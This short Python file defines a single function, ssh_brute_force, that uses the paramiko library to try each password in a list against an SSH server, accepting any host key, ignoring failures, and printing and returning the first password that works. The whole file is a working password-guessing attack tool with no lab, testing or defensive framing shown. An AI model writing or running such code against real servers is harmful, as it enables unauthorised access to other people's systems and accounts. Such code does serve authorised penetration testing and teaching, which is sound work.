import paramiko

def ssh_brute_force(host, user, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            client.connect(host, username=user, password=password.strip(), timeout=3)
            print(f"[+] Password Found: {password}")
            return password
        except:
            continue
    return None
